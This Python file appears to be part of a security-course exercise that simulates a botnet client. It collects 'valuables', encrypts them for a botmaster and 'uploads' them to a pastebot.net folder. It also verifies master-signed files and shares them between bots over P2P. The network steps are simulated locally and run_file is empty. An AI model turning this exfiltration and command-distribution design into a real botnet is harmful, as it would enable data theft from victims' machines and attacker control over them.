import base64
import os

from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_PSS
from Crypto.Cipher import PKCS1_v1_5

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}
# Valuable data to be sent to the botmaster
valuables = []

###

def save_valuable(data):
    valuables.append(data)


def encrypt_for_master(data):
    # open and read the public key
    public_key = open(os.path.join('master_keys', 'master_rsa.pub')).read()
    # import the public rsa key
    public_rsa_key = RSA.importKey(public_key)
    # use the public key to create a cipher for encrypting
    cipher = PKCS1_v1_5.new(public_rsa_key)
    # get the digest of original content
    digest = SHA.new(data).digest()
    # encrypt and return the encrypted data
    return cipher.encrypt(digest + data)


def upload_valuables_to_pastebot(fn):
    # Encrypt the valuables so only the bot master can read them
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "ascii")
    encrypted_master = encrypt_for_master(valuable_data)

    if encrypted_master is None:
        print("Failed to encrypt file pastebot.net/%s for the botnet master" % fn)
        return

    # "Upload" it to pastebot (i.e. save in pastebot folder)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()

    print("Saved valuables to pastebot.net/%s for the botnet master" % fn)


###

def verify_file(f):
    # slice the signature and the content
    signature = f[:256]
    content = f[256:]
    # open and read the public key
    public_key = open(os.path.join('master_keys', 'master_rsa.pub')).read()
    # import the public rsa key
    public_rsa_key = RSA.importKey(public_key)
    verifier = PKCS1_PSS.new(public_rsa_key)
    # get the digest of original content
    digest = SHA.new()
    digest.update(content)
    # verify the signature
    if verifier.verify(digest, signature):
        return True
    else:
        return False


def process_file(fn, f):
    if verify_file(f):
        # If it was, store it unmodified
        # (so it can be sent to other bots)
        # Decrypt and run the file
        filestore[fn] = f
        print("Stored the received file as %s" % fn)
    else:
        print("The file has not been signed by the botnet master")


def download_from_pastebot(fn):
    # "Download" the file from pastebot.net
    # (i.e. pretend we are and grab it from disk)
    # Open the file as bytes and load into memory
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f)


def p2p_download_file(sconn):
    # Download the file from the other bot
    fn = str(sconn.recv(), "ascii")
    f = sconn.recv()
    print("Receiving %s via P2P" % fn)
    process_file(fn, f)


###

def p2p_upload_file(sconn, fn):
    # Grab the file and upload it to the other bot
    # You don't need to encrypt it only files signed
    # by the botnet master should be accepted
    # (and your bot shouldn't be able to sign like that!)
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    print("Sending %s via P2P" % fn)
    sconn.send(fn)
    sconn.send(filestore[fn])


def run_file(f):
    # If the file can be run,
    # run the commands
    pass
